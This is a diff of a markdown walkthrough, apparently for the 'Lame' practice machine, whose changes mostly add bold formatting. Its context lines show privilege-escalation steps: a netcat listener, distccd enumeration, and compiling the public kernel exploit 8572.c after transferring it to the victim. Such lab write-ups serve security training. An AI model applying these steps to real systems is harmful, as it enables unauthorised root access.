@@ -104,7 +104,7 @@ nc -lnvp 9999
 **Rooted**
 -----------------------------------------------------------------------------------------------------------------------------------
 # Privilege Escalation no2
-Enumerating port 3621 (distccd)
+**Enumerating port 3621 (distccd)**
 
 ![lame9](https://user-images.githubusercontent.com/15195048/93902157-18de0780-fcac-11ea-9d38-70413e9d14dd.png)
 
@@ -140,10 +140,11 @@ uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
 
 
 # B)Kernel Exploit
-Kernel Exploit
+**uname -a**
+
 Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
 
-Search kernel exploits: 8572.c
+Search kernel exploits: **8572.c**
 
 Send with python server the exploit and get it from the victim machine
 gcc -o exp 8572.c #compile it and run it
